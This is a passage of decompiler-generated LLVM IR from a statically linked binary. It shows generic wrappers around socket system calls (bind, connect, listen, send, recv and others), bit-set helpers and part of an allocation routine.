dec_label_pc_bef4:                                ; preds = %dec_label_pc_bee0
  %v0_bef4 = call i32 @function_bdd4()
  %v0_bef8 = load i32, i32* %r4.global-to-local, align 4
  %v1_bef8 = sub i32 0, %v0_bef8
  %v2_befc = inttoptr i32 %v0_bef4 to i32*
  store i32 %v1_bef8, i32* %v2_befc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bf04

dec_label_pc_bf04:                                ; preds = %dec_label_pc_bee0, %dec_label_pc_bef4
  %v0_bf04 = phi i32 [ %v6_bee4, %dec_label_pc_bee0 ], [ -1, %dec_label_pc_bef4 ]
  %v2_bf08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bf08, i32* @r4, align 4
  ret i32 %v0_bf04

; uselistorder directives
  uselistorder i32 %v6_bee4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf04, { 1, 0 }
}

define i32 @function_bf0c(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bf0c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bf0c = load i32, i32* @r4, align 4
  store i32 %v3_bf0c, i32* %stack_var_-8, align 4
  %v5_bf10 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_bf10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_bf10, -4095
  br i1 %tmp, label %dec_label_pc_bf30, label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_bf0c
  %v0_bf20 = call i32 @function_bdd4()
  %v0_bf24 = load i32, i32* %r4.global-to-local, align 4
  %v1_bf24 = sub i32 0, %v0_bf24
  %v2_bf28 = inttoptr i32 %v0_bf20 to i32*
  store i32 %v1_bf24, i32* %v2_bf28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf0c, %dec_label_pc_bf20
  %v0_bf30 = phi i32 [ %v5_bf10, %dec_label_pc_bf0c ], [ -1, %dec_label_pc_bf20 ]
  %v2_bf34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bf34, i32* @r4, align 4
  ret i32 %v0_bf30

; uselistorder directives
  uselistorder i32 %v5_bf10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf30, { 1, 0 }
}

define i32 @function_bf38(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bf38:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bf38 = load i32, i32* @r4, align 4
  store i32 %v3_bf38, i32* %stack_var_-8, align 4
  %v5_bf3c = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_bf3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_bf3c, -4095
  br i1 %tmp, label %dec_label_pc_bf5c, label %dec_label_pc_bf4c

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_bf38
  %v0_bf4c = call i32 @function_bdd4()
  %v0_bf50 = load i32, i32* %r4.global-to-local, align 4
  %v1_bf50 = sub i32 0, %v0_bf50
  %v2_bf54 = inttoptr i32 %v0_bf4c to i32*
  store i32 %v1_bf50, i32* %v2_bf54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bf5c

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bf4c
  %v0_bf5c = phi i32 [ %v5_bf3c, %dec_label_pc_bf38 ], [ -1, %dec_label_pc_bf4c ]
  %v2_bf60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bf60, i32* @r4, align 4
  ret i32 %v0_bf5c

; uselistorder directives
  uselistorder i32 %v5_bf3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf5c, { 1, 0 }
}

define i32 @function_bf64(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bf64:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bf64 = load i32, i32* @r4, align 4
  store i32 %v3_bf64, i32* %stack_var_-8, align 4
  %v5_bf68 = inttoptr i32 %arg3 to i32*
  %v6_bf68 = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_bf68)
  store i32 %v6_bf68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_bf68, -4095
  br i1 %tmp, label %dec_label_pc_bf88, label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_bf64
  %v0_bf78 = call i32 @function_bdd4()
  %v0_bf7c = load i32, i32* %r4.global-to-local, align 4
  %v1_bf7c = sub i32 0, %v0_bf7c
  %v2_bf80 = inttoptr i32 %v0_bf78 to i32*
  store i32 %v1_bf7c, i32* %v2_bf80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bf88

dec_label_pc_bf88:                                ; preds = %dec_label_pc_bf64, %dec_label_pc_bf78
  %v0_bf88 = phi i32 [ %v6_bf68, %dec_label_pc_bf64 ], [ -1, %dec_label_pc_bf78 ]
  %v2_bf8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bf8c, i32* @r4, align 4
  ret i32 %v0_bf88

; uselistorder directives
  uselistorder i32 %v6_bf68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bf88, { 1, 0 }
}

define i32 @function_bf90(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_bf90:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bf90 = load i32, i32* @r4, align 4
  store i32 %v3_bf90, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_bf98 = call i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32* null)
  store i32 %v5_bf98, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_bf98, -4095
  br i1 %tmp, label %dec_label_pc_bfb8, label %dec_label_pc_bfa8

dec_label_pc_bfa8:                                ; preds = %dec_label_pc_bf90
  %v0_bfa8 = call i32 @function_bdd4()
  %v0_bfac = load i32, i32* %r4.global-to-local, align 4
  %v1_bfac = sub i32 0, %v0_bfac
  %v2_bfb0 = inttoptr i32 %v0_bfa8 to i32*
  store i32 %v1_bfac, i32* %v2_bfb0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bfb8

dec_label_pc_bfb8:                                ; preds = %dec_label_pc_bf90, %dec_label_pc_bfa8
  %v0_bfb8 = phi i32 [ %v5_bf98, %dec_label_pc_bf90 ], [ -1, %dec_label_pc_bfa8 ]
  %v2_bfbc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bfbc, i32* @r4, align 4
  ret i32 %v0_bfb8

; uselistorder directives
  uselistorder i32 %v5_bf98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bfb8, { 1, 0 }
}

define i32 @function_bfc0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_bfc0:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bfc0 = load i32, i32* @r4, align 4
  store i32 %v3_bfc0, i32* %stack_var_-8, align 4
  %v2_bfc4 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_bfc4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_bfc4, -4095
  br i1 %tmp, label %dec_label_pc_bfe4, label %dec_label_pc_bfd4

dec_label_pc_bfd4:                                ; preds = %dec_label_pc_bfc0
  %v0_bfd4 = call i32 @function_bdd4()
  %v0_bfd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_bfd8 = sub i32 0, %v0_bfd8
  %v2_bfdc = inttoptr i32 %v0_bfd4 to i32*
  store i32 %v1_bfd8, i32* %v2_bfdc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_bfc0, %dec_label_pc_bfd4
  %v0_bfe4 = phi i32 [ %v2_bfc4, %dec_label_pc_bfc0 ], [ -1, %dec_label_pc_bfd4 ]
  %v2_bfe8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_bfe8, i32* %r4.global-to-local, align 4
  ret i32 %v0_bfe4

; uselistorder directives
  uselistorder i32 %v2_bfc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bfe4, { 1, 0 }
}

define i32 @function_bfec(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_bfec:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_bfec = load i32, i32* @r4, align 4
  store i32 %v3_bfec, i32* %stack_var_-8, align 4
  %v5_bff0 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_bff0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_bff0, -4095
  br i1 %tmp, label %dec_label_pc_c010, label %dec_label_pc_c000

dec_label_pc_c000:                                ; preds = %dec_label_pc_bfec
  %v0_c000 = call i32 @function_bdd4()
  %v0_c004 = load i32, i32* %r4.global-to-local, align 4
  %v1_c004 = sub i32 0, %v0_c004
  %v2_c008 = inttoptr i32 %v0_c000 to i32*
  store i32 %v1_c004, i32* %v2_c008, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c010

dec_label_pc_c010:                                ; preds = %dec_label_pc_bfec, %dec_label_pc_c000
  %v0_c010 = phi i32 [ %v5_bff0, %dec_label_pc_bfec ], [ -1, %dec_label_pc_c000 ]
  %v2_c014 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c014, i32* @r4, align 4
  ret i32 %v0_c010

; uselistorder directives
  uselistorder i32 %v5_bff0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c010, { 1, 0 }
}

define i32 @function_c018(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_c018:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c018 = load i32, i32* @r4, align 4
  store i32 %v3_c018, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_c024 = call i32 @recvfrom(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32* null)
  store i32 %v5_c024, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_c024, -4095
  br i1 %tmp, label %dec_label_pc_c044, label %dec_label_pc_c034

dec_label_pc_c034:                                ; preds = %dec_label_pc_c018
  %v0_c034 = call i32 @function_bdd4()
  %v0_c038 = load i32, i32* %r4.global-to-local, align 4
  %v1_c038 = sub i32 0, %v0_c038
  %v2_c03c = inttoptr i32 %v0_c034 to i32*
  store i32 %v1_c038, i32* %v2_c03c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c044

dec_label_pc_c044:                                ; preds = %dec_label_pc_c018, %dec_label_pc_c034
  %v0_c044 = phi i32 [ %v5_c024, %dec_label_pc_c018 ], [ -1, %dec_label_pc_c034 ]
  %v2_c048 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c048, i32* %r4.global-to-local, align 4
  ret i32 %v0_c044

; uselistorder directives
  uselistorder i32 %v5_c024, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c044, { 1, 0 }
}

define i32 @function_c04c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c04c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c04c = load i32, i32* @r4, align 4
  store i32 %v3_c04c, i32* %stack_var_-8, align 4
  %v5_c050 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_c050, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_c050, -4095
  br i1 %tmp, label %dec_label_pc_c070, label %dec_label_pc_c060

dec_label_pc_c060:                                ; preds = %dec_label_pc_c04c
  %v0_c060 = call i32 @function_bdd4()
  %v0_c064 = load i32, i32* %r4.global-to-local, align 4
  %v1_c064 = sub i32 0, %v0_c064
  %v2_c068 = inttoptr i32 %v0_c060 to i32*
  store i32 %v1_c064, i32* %v2_c068, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c070

dec_label_pc_c070:                                ; preds = %dec_label_pc_c04c, %dec_label_pc_c060
  %v0_c070 = phi i32 [ %v5_c050, %dec_label_pc_c04c ], [ -1, %dec_label_pc_c060 ]
  %v2_c074 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c074, i32* @r4, align 4
  ret i32 %v0_c070

; uselistorder directives
  uselistorder i32 %v5_c050, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c070, { 1, 0 }
}

define i32 @function_c078(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_c078:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c078 = load i32, i32* @r4, align 4
  store i32 %v3_c078, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_c080 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_c080, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_c080, -4095
  br i1 %tmp, label %dec_label_pc_c0a0, label %dec_label_pc_c090

dec_label_pc_c090:                                ; preds = %dec_label_pc_c078
  %v0_c090 = call i32 @function_bdd4()
  %v0_c094 = load i32, i32* %r4.global-to-local, align 4
  %v1_c094 = sub i32 0, %v0_c094
  %v2_c098 = inttoptr i32 %v0_c090 to i32*
  store i32 %v1_c094, i32* %v2_c098, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c0a0

dec_label_pc_c0a0:                                ; preds = %dec_label_pc_c078, %dec_label_pc_c090
  %v0_c0a0 = phi i32 [ %v5_c080, %dec_label_pc_c078 ], [ -1, %dec_label_pc_c090 ]
  %v2_c0a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c0a4, i32* %r4.global-to-local, align 4
  ret i32 %v0_c0a0

; uselistorder directives
  uselistorder i32 %v5_c080, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c0a0, { 1, 0 }
}

define i32 @function_c0a8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_c0a8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c0a8 = load i32, i32* @r4, align 4
  store i32 %v3_c0a8, i32* %stack_var_-8, align 4
  %v3_c0ac = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_c0ac, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_c0ac, -4095
  br i1 %tmp, label %dec_label_pc_c0cc, label %dec_label_pc_c0bc

dec_label_pc_c0bc:                                ; preds = %dec_label_pc_c0a8
  %v0_c0bc = call i32 @function_bdd4()
  %v0_c0c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_c0c0 = sub i32 0, %v0_c0c0
  %v2_c0c4 = inttoptr i32 %v0_c0bc to i32*
  store i32 %v1_c0c0, i32* %v2_c0c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c0cc

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c0a8, %dec_label_pc_c0bc
  %v0_c0cc = phi i32 [ %v3_c0ac, %dec_label_pc_c0a8 ], [ -1, %dec_label_pc_c0bc ]
  %v2_c0d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c0d0, i32* @r4, align 4
  ret i32 %v0_c0cc

; uselistorder directives
  uselistorder i32 %v3_c0ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c0cc, { 1, 0 }
}

define i32 @function_c0d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c0d4:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c0d4 = load i32, i32* @r4, align 4
  store i32 %v3_c0d4, i32* %stack_var_-12, align 4
  %v6_c0d4 = load i32, i32* @r5, align 4
  %v10_c0d4 = ptrtoint i32* %stack_var_-12 to i32
  %v7_c0d8 = icmp eq i32 %arg2, -1
  %v0_c0e4.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_c0d8, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_c0d4
  br label %dec_label_pc_c0fc

bb:                                               ; preds = %dec_label_pc_c0d4
  %v2_c0e0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_c0e4.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_c0e4.pre, 1
  br i1 %tmp19, label %dec_label_pc_c0fc, label %dec_label_pc_c0ec

dec_label_pc_c0ec:                                ; preds = %bb
  %v7_c0f0 = icmp sgt i32 %v0_c0e4.pre, 64
  br i1 %v7_c0f0, label %dec_label_pc_c0fc, label %bb20

bb20:                                             ; preds = %dec_label_pc_c0ec
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_c12024 = add i32 %v10_c0d4, 124
  store i32 %v5_c12024, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c110

dec_label_pc_c0fc:                                ; preds = %.thread, %dec_label_pc_c0ec, %bb
  %v0_c0fc = call i32 @function_bdd4()
  store i32 %v0_c0fc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c108 = inttoptr i32 %v0_c0fc to i32*
  store i32 22, i32* %v2_c108, align 4
  %v0_c17c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c17c

dec_label_pc_c110:                                ; preds = %bb20, %dec_label_pc_c110
  %v5_c12025 = phi i32 [ %v5_c12024, %bb20 ], [ %v5_c120, %dec_label_pc_c110 ]
  %v2_c114 = add i32 %v5_c12025, -136
  %v3_c114 = inttoptr i32 %v2_c114 to i32*
  store i32 0, i32* %v3_c114, align 4
  %v0_c118.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_c118 = add i32 %v0_c118.pre, -1
  store i32 %v1_c118, i32* %r0.global-to-local, align 4
  %v6_c118 = icmp slt i32 %v1_c118, 0
  %v4_c120 = mul i32 %v1_c118, 4
  %v5_c120 = add i32 %v4_c120, %v10_c0d4
  store i32 %v5_c120, i32* %r2.global-to-local, align 4
  br i1 %v6_c118, label %dec_label_pc_c128, label %dec_label_pc_c110

dec_label_pc_c128:                                ; preds = %dec_label_pc_c110
  %v2_c128 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_c128, i32* @r5, align 4
  %v2_c12c = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_c12c, i32* %r0.global-to-local, align 4
  %v0_c130 = load i32, i32* @r4, align 4
  %v2_c134 = call i32 @function_c1b0(i32 %v2_c12c, i32 %v0_c130)
  store i32 %v2_c134, i32* %r0.global-to-local, align 4
  %v1_c138 = icmp slt i32 %v2_c134, 0
  br i1 %v1_c138, label %dec_label_pc_c178, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %dec_label_pc_c128
  %v0_c140 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1749c.225 to i32), i32* %r0.global-to-local, align 4
  %v2_c148 = call i32 @function_c18c(i32 ptrtoint (i32* @global_var_1749c.225 to i32), i32 %v0_c140)
  store i32 %v2_c0e0, i32* %r2.global-to-local, align 4
  %v0_c160 = load i32, i32* @r4, align 4
  store i32 %v0_c160, i32* %r0.global-to-local, align 4
  %v4_c168 = call i32 @function_d0d8(i32 %v0_c160, i32* nonnull %stack_var_-152, i32 %v2_c0e0)
  store i32 %v4_c168, i32* %r0.global-to-local, align 4
  %v1_c16c = icmp slt i32 %v4_c168, 0
  br i1 %v1_c16c, label %dec_label_pc_c178, label %bb23

bb23:                                             ; preds = %dec_label_pc_c140
  %v5_c170 = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_c170, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c17c

dec_label_pc_c178:                                ; preds = %dec_label_pc_c140, %dec_label_pc_c128
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c17c

dec_label_pc_c17c:                                ; preds = %bb23, %dec_label_pc_c0fc, %dec_label_pc_c178
  %v0_c17c = phi i32 [ %v5_c170, %bb23 ], [ %v0_c17c.pre, %dec_label_pc_c0fc ], [ -1, %dec_label_pc_c178 ]
  store i32 %v0_c17c, i32* %r0.global-to-local, align 4
  %v2_c184 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c184, i32* @r4, align 4
  store i32 %v6_c0d4, i32* @r5, align 4
  ret i32 %v0_c17c

; uselistorder directives
  uselistorder i32 %v0_c17c, { 1, 0 }
  uselistorder i32 %v5_c120, { 1, 0 }
  uselistorder i32 %v1_c118, { 0, 2, 1 }
  uselistorder i32 %v2_c0e0, { 1, 0 }
  uselistorder i32 %v0_c0e4.pre, { 1, 0, 2 }
  uselistorder i32 %v10_c0d4, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 8, 6, 7, 10, 9, 11, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c17c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c110, { 1, 0 }
  uselistorder label %dec_label_pc_c0fc, { 1, 2, 0 }
}

define i32 @function_c18c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c18c:
  %v1_c18c = add i32 %arg2, -1
  %v3_c190 = udiv i32 %v1_c18c, 32
  %v4_c194 = mul nuw nsw i32 %v3_c190, 4
  %v5_c194 = add i32 %v4_c194, %arg1
  %v6_c194 = inttoptr i32 %v5_c194 to i32*
  %v7_c194 = load i32, i32* %v6_c194, align 4
  %v1_c198 = urem i32 %v1_c18c, 32
  %v7_c1a0 = shl i32 1, %v1_c198
  %v8_c1a0 = and i32 %v7_c194, %v7_c1a0
  %v10_c1a0 = icmp ne i32 %v8_c1a0, 0
  %. = zext i1 %v10_c1a0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_c18c, { 1, 0 }
}

define i32 @function_c1b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c1b0:
  %v1_c1b0 = add i32 %arg2, -1
  %v3_c1b4 = udiv i32 %v1_c1b0, 32
  %v4_c1b8 = mul nuw nsw i32 %v3_c1b4, 4
  %v5_c1b8 = add i32 %v4_c1b8, %arg1
  %v6_c1b8 = inttoptr i32 %v5_c1b8 to i32*
  %v7_c1b8 = load i32, i32* %v6_c1b8, align 4
  %v1_c1bc = urem i32 %v1_c1b0, 32
  %v7_c1c4 = shl i32 1, %v1_c1bc
  %v8_c1c4 = or i32 %v7_c1b8, %v7_c1c4
  store i32 %v8_c1c4, i32* %v6_c1b8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c1b0, { 1, 0 }
}

define i32 @function_c1d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c1d4:
  %v1_c1d4 = add i32 %arg2, -1
  %v3_c1d8 = udiv i32 %v1_c1d4, 32
  %v4_c1dc = mul nuw nsw i32 %v3_c1d8, 4
  %v5_c1dc = add i32 %v4_c1dc, %arg1
  %v6_c1dc = inttoptr i32 %v5_c1dc to i32*
  %v7_c1dc = load i32, i32* %v6_c1dc, align 4
  %v1_c1e0 = urem i32 %v1_c1d4, 32
  %tmp = shl i32 -1, %v1_c1e0
  %v8_c1e8 = add i32 %tmp, -1
  %v9_c1e8 = and i32 %v7_c1dc, %v8_c1e8
  store i32 %v9_c1e8, i32* %v6_c1dc, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c1d4, { 1, 0 }
}

define i32 @function_c1f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_c1f8:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c1f8 = load i32, i32* @r4, align 4
  %v6_c1f8 = load i32, i32* @r5, align 4
  %v9_c1f8 = load i32, i32* @r6, align 4
  %v0_c1fc = load i32, i32* %r0.global-to-local, align 4
  %v2_c1fc = icmp eq i32 %v0_c1fc, 0
  %v2_c200 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_c1fc, label %bb, label %dec_label_pc_c20c

bb:                                               ; preds = %dec_label_pc_c1f8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c214

dec_label_pc_c20c:                                ; preds = %dec_label_pc_c1f8
  %tmp = icmp ugt i32 %v0_c1fc, -8
  br i1 %tmp, label %dec_label_pc_c318, label %dec_label_pc_c214

dec_label_pc_c214:                                ; preds = %bb, %dec_label_pc_c20c
  %v0_c214 = phi i32 [ %v0_c1fc, %dec_label_pc_c20c ], [ 1, %bb ]
  %v1_c214 = add i32 %v0_c214, 4
  store i32 %v1_c214, i32* %stack_var_-20, align 4
  store i32 %v2_c200, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_17454.227 to i32), i32* %r0.global-to-local, align 4
  %v1_c22c = call i32 @function_cdec()
  store i32 ptrtoint (i32** @global_var_172c4.231 to i32), i32* %r0.global-to-local, align 4
  %v3_c238 = call i32 @function_c494(i32* bitcast (i32** @global_var_172c4.231 to i32*), i32 %v2_c200)
  store i32 %v3_c238, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_17454.227 to i32), i32* %r0.global-to-local, align 4
  store i32 49744, i32* @lr, align 4
  %v1_c24c = call i32 @function_cdec()
  store i32 %v1_c24c, i32* %r0.global-to-local, align 4
  %v2_c250 = icmp eq i32 %v3_c238, 0
  br i1 %v2_c250, label %dec_label_pc_c258, label %dec_label_pc_c308

dec_label_pc_c258:                                ; preds = %dec_label_pc_c214
  %v2_c25c = load i32, i32* @global_var_1747c.234, align 4
  store i32 %v2_c25c, i32* @r4, align 4
  %v2_c260 = load i32, i32* %stack_var_-20, align 4
  %v3_c264 = icmp ult i32 %v2_c260, %v2_c25c
  br i1 %v3_c264, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_c258
  %v3_c268 = add i32 %v2_c25c, -1
  %v2_c26c = add i32 %v3_c268, %v2_c260
  %v2_c270 = sub i32 0, %v2_c25c
  %v3_c274 = and i32 %v2_c26c, %v2_c270
  store i32 %v3_c274, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_c258, %bb14
  store i32 ptrtoint (i32* @global_var_1751c.236 to i32), i32* %r0.global-to-local, align 4
  %v1_c280 = call i32 @function_cdec()
  %v0_c284 = load i32, i32* @r4, align 4
  store i32 %v0_c284, i32* %r0.global-to-local, align 4
  %v1_c288 = call i32 @function_d5e4(i32 %v0_c284)
  store i32 %v1_c288, i32* %r0.global-to-local, align 4
  %v7_c28c = icmp eq i32 %v1_c288, -1
  br i1 %v7_c28c, label %bb15, label %dec_label_pc_c298

bb15:                                             ; preds = %.thread3
  store i32 %v1_c288, i32* @r5, align 4
  br label %dec_label_pc_c2ac

dec_label_pc_c298:                                ; preds = %.thread3
  %v1_c298 = add i32 %v1_c288, 3
  %v1_c29c = and i32 %v1_c298, -4
  store i32 %v1_c29c, i32* @r5, align 4
  %v9_c2a0 = icmp eq i32 %v1_c29c, %v1_c288
  br i1 %v9_c2a0, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_c298
  %v3_c2a4 = sub i32 %v1_c29c, %v1_c288
  store i32 %v3_c2a4, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_c298, %bb16
  %v1_c2a8 = xor i1 %v9_c2a0, true
  call void @__pseudo_cond_branch(i1 %v1_c2a8, i32 ptrtoint (i32* @global_var_d5e4.237 to i32))
  br label %dec_label_pc_c2ac

dec_label_pc_c2ac:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1751c.236 to i32), i32* %r0.global-to-local, align 4
  store i32 49852, i32* @lr, align 4
  %v1_c2b8 = call i32 @function_cdec()
  store i32 %v1_c2b8, i32* %r0.global-to-local, align 4
  %v0_c2bc = load i32, i32* @r5, align 4
  %v7_c2bc = icmp eq i32 %v0_c2bc, -1
  br i1 %v7_c2bc, label %dec_label_pc_c318, label %dec_label_pc_c2c4

dec_label_pc_c2c4:                                ; preds = %dec_label_pc_c2ac
  store i32 ptrtoint (i32* @global_var_17454.227 to i32), i32* %r0.global-to-local, align 4
  %v1_c2d0 = call i32 @function_cdec()
  %v0_c2d4 = load i32, i32* @r4, align 4
  %v0_c2d8 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_172c4.231 to i32), i32* %r0.global-to-local, align 4
  %v4_c2e0 = call i32 @function_c55c(i32* bitcast (i32** @global_var_172c4.231 to i32*), i32 %v0_c2d8, i32 %v0_c2d4)
